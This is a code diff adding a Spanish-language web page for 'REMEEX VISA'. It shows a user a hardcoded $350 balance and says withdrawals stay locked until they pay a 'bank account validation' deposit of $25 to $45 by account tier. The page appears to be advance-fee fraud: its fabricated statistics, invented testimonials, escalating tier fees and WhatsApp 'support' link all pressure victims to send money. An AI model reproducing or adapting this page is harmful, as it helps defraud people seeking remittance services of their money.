@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <script src="repair.js"></script>
+  <script src="global-data.js"></script>
+  <script>
+    function getRecargaPage(){
+      try{
+        const reg=JSON.parse(localStorage.getItem('visaRegistrationCompleted')||'{}');
+        return reg.useOldRecarga?'recarga3.html':'homevisa.html';
+      }catch(e){return 'homevisa.html';}
+    }
+  </script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=0.85, user-scalable=no">
+  <title>Estado de Tu Cuenta - REMEEX VISA</title>
+  <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+  <link rel="apple-touch-icon" href="visabluapple.png">
+  <meta name="description" content="Remeex VISA: transferencias globales sin comisiones, rapidas y seguras."/>
+  <meta name="keywords" content="remesas, transferencias internacionales, enviar dinero, VISA"/>
+  <meta name="author" content="Remeex VISA"/>
+  <meta name="robots" content="index, follow"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="estatus.min.css">
+  <link rel="stylesheet" href="responsive.css">
+  <style>html{font-size:51%;}</style>
+</head>
+<body>
+  <!-- Header -->
+  <div class="header">
+    <div class="header-brand">
+      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnBzNdjl6bNp-nIdaiHVENczJhwlJNA7ocsyiOObMmzbu8at0dY5yGcZ9cLxLF39qI6gwNfqBxlkTDC0txVULEwQVwGkeEzN0Jq9MRTRagA48mh18UqTlR4WhsXOLAEZugUyhqJHB19xJgnkpe-S5VOWFgzpKFwctv3XP9XhH41vNTvq0ZS-nik58Qhr-O/s320/remeex.png" alt="REMEEX">
+      <span class="header-user" id="header-user-name"></span>
+    </div>
+<div class="header-actions">
+  <a href="dudas" class="header-action-btn btn-outline">
+    <i class="fas fa-question-circle"></i> ¿Dudas?
+  </a>
+  <a href="https://wa.me/+17373018059" class="header-action-btn btn-primary" target="_blank">
+    <i class="fab fa-whatsapp"></i> Soporte 24/7
+  </a>
+</div>
+  </div>
+  <div class="container">
+    <!-- Hero Section -->
+    <section class="hero-section">
+        <div class="hero-content">
+          <h1 class="hero-title" id="hero-title">¡Felicidades! Has Completado tu Verificación</h1>
+          <p class="hero-subtitle" id="hero-subtitle">Tu identidad ha sido confirmada exitosamente. Solo falta un paso para activar todas las funciones de tu cuenta REMEEX VISA.</p>
+      </div>
+    </section>
+<!-- Progress Banner -->
+<div class="progress-banner">
+  <div class="progress-banner-icon">
+    <i class="fas fa-check-circle"></i>
+  </div>
+  <div class="progress-banner-content">
+    <div class="progress-banner-title">¡Todo va perfecto! Has hecho todo correctamente</div>
+    <div class="progress-banner-text">
+      Tu proceso de <strong>verificación de identidad</strong> ha sido completado con éxito. La documentación que enviaste ha sido aprobada. 
+      Ahora solo necesitas completar la <strong>validación de tu cuenta bancaria</strong> para desbloquear retiros ilimitados y todas las funciones premium.
+    </div>
+  </div>
+</div>
+
+<!-- Account Level Banner -->
+<div class="account-level">
+  <div class="level-content">
+    <div class="level-header">
+      <div class="level-info">
+        <div class="level-icon">
+          <i class="fas fa-star"></i>
+        </div>
+        <div class="level-details">
+          <h2 id="account-level-title">Cuenta Estándar Verificada</h2>
+          <p class="level-subtitle" id="account-level-subtitle">Identidad confirmada • $0 - $500 USD</p>
+        </div>
+      </div>
+        <div class="balance-display">
+          <div class="balance-main" id="balance-value">$350.00</div>
+          <div class="balance-label">Saldo Disponible</div>
+        </div>
+    </div>
+  </div>
+</div>
+
+<!-- Status Steps -->
+<section class="status-steps">
+  <h2 class="section-title">
+    <i class="fas fa-route"></i>
+    Tu Progreso en REMEEX VISA
+  </h2>
+  
+  <div class="steps-container">
+    <div class="steps-progress">
+      <div class="steps-progress-bar" id="steps-progress-bar" style="height: 75%;"></div>
+    </div>
+
+    <div class="step-item" id="step-register">
+      <div class="step-icon">
+        <i class="fas fa-check"></i>
+      </div>
+      <div class="step-content">
+        <div class="step-title">✓ Registro Completado</div>
+        <div class="step-description">Has creado tu cuenta REMEEX VISA exitosamente y confirmado tu email.</div>
+      </div>
+    </div>
+
+    <div class="step-item" id="step-first-recharge">
+      <div class="step-icon">
+        <i class="fas fa-check"></i>
+      </div>
+      <div class="step-content">
+        <div class="step-title">✓ Primera Recarga Realizada</div>
+        <div class="step-description">Has agregado fondos a tu cuenta y ya puedes usar servicios básicos.</div>
+      </div>
+    </div>
+
+    <div class="step-item" id="step-identity">
+      <div class="step-icon">
+        <i class="fas fa-check"></i>
+      </div>
+      <div class="step-content">
+        <div class="step-title">✓ Verificación de Identidad Aprobada</div>
+        <div class="step-description">Tu documentación ha sido revisada y aprobada. Tu identidad está 100% confirmada.</div>
+      </div>
+    </div>
+
+    <div class="step-item" id="step-bank-validation">
+      <div class="step-icon">
+        <i class="fas fa-university"></i>
+      </div>
+      <div class="step-content">
+        <div class="step-title">Validación de Cuenta Bancaria</div>
+        <div class="step-description">
+          Para garantizar que puedas retirar fondos de forma segura a tu banco, necesitamos validar que la cuenta bancaria registrada es realmente tuya.
+           Esto se hace mediante una recarga de <strong id="verification-usd">$0.00</strong> (<span id="verification-bs">Bs 0,00</span>) desde tu cuenta bancaria.
+        </div>
+        <button class="step-action" onclick="location.href=getRecargaPage()">
+          <i class="fas fa-credit-card"></i> Completar Validación Ahora
+        </button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Stats -->
+<div class="stats-container">
+  <div class="stat-item">
+    <div class="stat-number">18,945</div>
+    <div class="stat-label">Usuarios Verificados</div>
+  </div>
+  
+  <div class="stat-item">
+    <div class="stat-number">99.2%</div>
+    <div class="stat-label">Completan Validación</div>
+  </div>
+  
+  <div class="stat-item">
+    <div class="stat-number">2 min</div>
+    <div class="stat-label">Tiempo Promedio</div>
+  </div>
+</div>
+
+<!-- Explanation Cards -->
+<div class="explanation-cards">
+  <div class="explanation-card">
+    <div class="card-header">
+      <div class="card-icon">
+        <i class="fas fa-shield-check"></i>
+      </div>
+      <div>
+        <div class="card-title">Verificación vs Validación</div>
+        <div class="card-subtitle">¿Cuál es la diferencia?</div>
+      </div>
+    </div>
+    <div class="card-content">
+      <p><strong>Verificación de Identidad</strong> (Ya completada ✓): Confirmamos que eres quien dices ser mediante tus documentos.</p>
+      
+      <p><strong>Validación de Cuenta Bancaria</strong> (Pendiente): Confirmamos que la cuenta bancaria registrada realmente te pertenece.</p>
+      
+      <div class="highlighted-text">
+          <strong>¡Ya hiciste la parte más difícil!</strong> La validación es súper rápida: solo haces una recarga de <span id="verification-usd-text">$0.00</span> (<span id="verification-bs-text">Bs 0,00</span>) desde tu banco y ¡listo!
+      </div>
+    </div>
+  </div>
+
+  <div class="explanation-card">
+    <div class="card-header">
+      <div class="card-icon validation">
+        <i class="fas fa-university"></i>
+      </div>
+      <div>
+        <div class="card-title">¿Por qué Validar mi Cuenta?</div>
+        <div class="card-subtitle">Seguridad y funcionalidades</div>
+      </div>
+    </div>
+    <div class="card-content">
+      <p>La validación nos permite confirmar que tienes acceso real a la cuenta bancaria donde quieres recibir tus retiros.</p>
+      
+      <p><strong>Sin validación:</strong> Solo puedes recibir dinero, pero no retirarlo.</p>
+      <p><strong>Con validación:</strong> Retiros ilimitados, sin restricciones bancarias, acceso a Zelle y servicios premium.</p>
+      
+      <div class="highlighted-text">
+          <strong>Los <span id="verification-usd-note">$0.00</span> no se pierden:</strong> Se acreditan inmediatamente a tu saldo disponible.
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Validation Requirements -->
+<div class="validation-requirements">
+  <h3 class="section-title">
+    <i class="fas fa-list-check"></i>
+    Requisitos de Validación por Nivel de Cuenta
+  </h3>
+  
+  <table class="requirement-table">
+    <thead>
+      <tr>
+        <th>Nivel de Cuenta</th>
+        <th>Saldo Requerido</th>
+        <th>Monto de Validación</th>
+        <th>Beneficios Desbloqueados</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr class="current">
+        <td><strong>Estándar</strong></td>
+        <td>$0 - $500</td>
+        <td><span class="highlight-amount" id="verification-usd-table">$25</span> <span id="verification-bs-table" class="highlight-amount-sub">(Bs 0,00)</span></td>
+        <td>Retiros ilimitados + Sin restricciones bancarias</td>
+      </tr>
+      <tr>
+        <td><strong>Bronce</strong></td>
+        <td>$501 - $1,000</td>
+        <td><span class="highlight-amount">$30 USD</span></td>
+        <td>Cuenta Bronce + Límites ampliados</td>
+      </tr>
+      <tr>
+        <td><strong>Platinum</strong></td>
+        <td>$1,001 - $2,000</td>
+        <td><span class="highlight-amount">$35 USD</span></td>
+        <td>Cuenta Platinum + Soporte prioritario</td>
+      </tr>
+      <tr>
+        <td><strong>Uranio Visa</strong></td>
+        <td>$2,001 - $5,000</td>
+        <td><span class="highlight-amount">$40 USD</span></td>
+        <td>Cuenta Uranio Visa con seguro internacional</td>
+      </tr>
+      <tr>
+        <td><strong>Uranio Infinite</strong></td>
+        <td>$5,001 - $10,000</td>
+        <td><span class="highlight-amount">$45 USD</span></td>
+        <td>Beneficios exclusivos de nivel Infinite</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<!-- Trust Signals -->
+<div class="trust-signals">
+  <div class="trust-item">
+    <div class="trust-icon">
+      <i class="fas fa-shield-alt"></i>
+    </div>
+    <div class="trust-text">Proceso estándar internacional de seguridad bancaria</div>
+  </div>
+  
+  <div class="trust-item">
+    <div class="trust-icon">
+      <i class="fas fa-check-circle"></i>
+    </div>
+    <div class="trust-text">Se realiza una sola vez por cuenta bancaria</div>
+  </div>
+  
+  <div class="trust-item">
+    <div class="trust-icon">
+      <i class="fas fa-dollar-sign"></i>
+    </div>
+    <div class="trust-text">El dinero se acredita inmediatamente a tu saldo</div>
+  </div>
+  
+  <div class="trust-item">
+    <div class="trust-icon">
+      <i class="fas fa-lock"></i>
+    </div>
+    <div class="trust-text">Protege contra fraudes y cuentas no autorizadas</div>
+  </div>
+</div>
+
+<!-- Testimonials -->
+<section class="testimonials-section">
+  <h2 class="section-title">
+    <i class="fas fa-star"></i>
+    Lo que dicen usuarios que ya completaron su validación
+  </h2>
+  
+  <div class="testimonials-container">
+    <div class="testimonial-card">
+      <div class="testimonial-content">
+          <p>"Al principio pensé que era complicado, pero fue súper fácil. Hice la recarga de <span id="verification-usd-test">$0.00</span> desde mi banco, se acreditó al instante y ya pude retirar todos mis fondos sin problemas. ¡Muy recomendado!"</p>
+      </div>
+      
+      <div class="testimonial-user">
+        <div class="user-avatar">MG</div>
+        <div class="user-info">
+          <div class="user-name">María González</div>
+          <div class="user-title">Validó su cuenta en 2 minutos</div>
+        </div>
+      </div>
+    </div>
+    
+    <div class="testimonial-card">
+      <div class="testimonial-content">
+        <p>"Lo que más me gustó fue que los <span id="verification-usd-test2">$0.00</span> que deposité se sumaron a mi saldo inmediatamente. No perdí nada y ahora puedo retirar dinero cuando quiera. El proceso de validación vale totalmente la pena."</p>
+      </div>
+      
+      <div class="testimonial-user">
+        <div class="user-avatar">JR</div>
+        <div class="user-info">
+          <div class="user-name">Juan Rodríguez</div>
+          <div class="user-title">Cuenta validada exitosamente</div>
+        </div>
+      </div>
+    </div>
+    
+    <div class="testimonial-card">
+      <div class="testimonial-content">
+        <p>"Después de validar mi cuenta, pude retirar $800 a mi banco sin ningún problema. El dinero llegó en menos de 24 horas. REMEEX VISA cumple lo que promete."</p>
+      </div>
+      
+      <div class="testimonial-user">
+        <div class="user-avatar">LP</div>
+        <div class="user-info">
+          <div class="user-name">Laura Pérez</div>
+          <div class="user-title">Retiró $800 después de validar</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Action Buttons -->
+<div class="action-buttons">
+  <a href="recarga" class="btn btn-cta">
+    <i class="fas fa-university"></i> Validar mi Cuenta Ahora
+  </a>
+  
+  <a href="dudas" class="btn btn-secondary">
+    <i class="fas fa-question-circle"></i> Tengo Dudas sobre el Proceso
+  </a>
+</div>
+
+<!-- Support Notice -->
+<div class="progress-banner" style="margin-top: 2rem;">
+  <div class="progress-banner-icon" style="background: var(--info);">
+    <i class="fas fa-headset"></i>
+  </div>
+  <div class="progress-banner-content">
+    <div class="progress-banner-title">¿Necesitas ayuda para completar la validación?</div>
+    <div class="progress-banner-text">
+      Nuestro equipo de soporte está disponible 24/7 para ayudarte con cualquier duda sobre el proceso de validación. 
+      Contacta vía WhatsApp y te asistiremos en menos de 5 minutos.
+    </div>
+    <div style="margin-top: 1rem;">
+      <a href="https://wa.me/+17373018059" class="btn btn-cta" target="_blank" style="font-size: 0.9rem; padding: 0.75rem 1.5rem;">
+        <i class="fab fa-whatsapp"></i> Contactar Soporte Ahora
+      </a>
+    </div>
+  </div>
+</div>
+  </div>
+  <!-- Reproducir sonido de construcción al ingresar -->
+  <audio id="buildingSound" preload="auto" style="display:none;">
+    <source src="remeexvisabuilding.ogg" type="audio/ogg">
+  </audio>
+  <script src="estatus.min.js"></script>
+</body>
+</html>
+  <script src="preload.js"></script>
